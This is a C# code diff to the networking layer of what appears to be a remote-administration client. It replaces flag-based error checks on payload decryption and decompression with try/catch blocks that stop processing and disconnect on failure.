@@ -483,25 +483,31 @@ namespace xClient.Core.Networking
 
                                 if (_writeOffset == _payloadLen)
                                 {
-                                    bool isError = _payloadBuffer.Length == 0;
+                                    if (_payloadBuffer.Length == 0)
+                                    {
+                                        process = false;
+                                        Disconnect();
+                                        break;
+                                    }
 
-                                    if (!isError)
+                                    try
                                     {
                                         if (encryptionEnabled)
                                             _payloadBuffer = AES.Decrypt(_payloadBuffer);
-
-                                        isError = _payloadBuffer.Length == 0; // check if payload decryption failed
+                                    }
+                                    catch
+                                    {
+                                        process = false;
+                                        Disconnect();
+                                        break;
                                     }
 
-                                    if (!isError)
+                                    try
                                     {
                                         if (compressionEnabled)
                                             _payloadBuffer = SafeQuickLZ.Decompress(_payloadBuffer);
-
-                                        isError = _payloadBuffer.Length == 0; // check if payload decompression failed
                                     }
-
-                                    if (isError)
+                                    catch
                                     {
                                         process = false;
                                         Disconnect();
